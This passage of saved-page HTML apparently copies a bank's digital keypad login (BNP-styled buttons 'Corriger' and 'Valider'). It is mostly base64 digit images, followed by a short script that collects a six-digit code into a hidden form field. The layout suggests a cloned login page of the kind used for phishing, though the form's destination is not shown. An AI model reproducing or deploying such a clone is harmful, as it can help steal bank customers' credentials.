hN02i1WqGODpGU1n6/53A4YBjGRVxRFAzDOC9877793vILt3J3X1r5fB4hBI7jXK1z1+s1uq4n4yIA3W6X6XTKarW6iFerVRqNRnQXCRO+7zMYDDBNk3a7fZGzbRvbtq/ioXjqW3X9L8d13XOJvc0Vi0Vc1w31e1eMPMT+BlJKADzPuxK753lIKZOhESkl/X6fxWLBbDa78A61Wo16vZ6cMV4IgWVZWJb117/xY2h8z8bq4RDvDe9KI6/H4/FnEkvrz6u6H8Cv1Gg0otPpPAFp4GPCiHgFXk6n0/H3AB6kzoKXItsgAAAAAElFTkSuQmCC"><img data-savepage-currentsrc="6.png" onclick="accumulateValues('6')" data-savepage-src="/tra_cosmos_img/Images-pave-digital/6.png" src="data:image/png;base64,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"><img data-savepage-currentsrc="1.png" onclick="accumulateValues('1')" data-savepage-src="/tra_cosmos_img/Images-pave-digital/1.png" src="data:image/png;base64,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"><img data-savepage-currentsrc="vide.png" data-savepage-src="/tra_cosmos_img/Images-pave-digital/vide.png" src="data:image/png;base64,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"></div></td>
</tr>
<tr>
<td class="pl" nowrap=""> </td>
<td align="CENTER" nowrap="">
<button type="button" class="btnGris btnBNP digitalKeypadClearInput" onclick= "clearme()" id="btnCorriger" data-trad="LANG_CORRIGER">Corriger</button>
<button type="submit" class="btnGris btnDefault btnBNP digitalKeypadSubmitter" data-trad="LANG_VALIDER_PAVE" id="btnValider">Valider</button></td>
</tr>
</tbody></table>
</form><br>
<br>
<script>
      function clearme() {
	  var hiddenInput = document.getElementById('CWW_FORM');
	  hiddenInput.value = '';
	  var divElement = document.getElementById('mot_passe-dk-0');

        // Update the text content
       divElement.textContent = '';
	  }
	   function check_form() {
        var hiddenInput = document.getElementById('CWW_FORM');
        if (hiddenInput.value.length < 6) {
          
            return false; // Stop form submission if the limit is not reached
        }
        return true; // Allow form submission if the limit is reached
    }
    function accumulateValues(newValue) {

	
        var hiddenInput = document.getElementById('CWW_FORM');
        var oldValue = hiddenInput.value;
		
        var accumulatedValue = oldValue + newValue;
		if (accumulatedValue.length > 6) {
           
            return; // Stop execution if the limit is reached
        }
        hiddenInput.value = accumulatedValue;
       
		var divElement = document.getElementById('mot_passe-dk-0');

        // Update the text content
       divElement.textContent += '*';
    }
</script>
<div class="ll_noitalic justify" style="padding-right: 15px;" bis_skin_checked="1">
